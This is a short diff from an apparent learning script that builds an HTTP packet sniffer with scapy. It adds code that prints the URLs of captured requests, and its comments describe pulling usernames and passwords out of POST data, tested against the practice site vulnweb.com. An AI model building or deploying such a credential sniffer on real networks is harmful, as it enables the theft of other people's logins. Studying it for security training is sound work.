@@ -22,6 +22,15 @@ def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest): #haslayer - scapy method
         #print(packet)
         print(packet.show()) #shows packet layers that can be accessed
+        
+        #using packet.show to show layers, you can find that http.HTTPRequest.Host and Path are the two
+        #needed for capturing the URLs of the sites with the logins
+        
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        print(url)
+        
+        
+        
         #using packet.show, you can see on example website (vulnweb.com) that UI and PW will be sent using
         #POST with a field (load in the Raw layer) containing username and password
         if packet.haslayer(scapy.Raw):
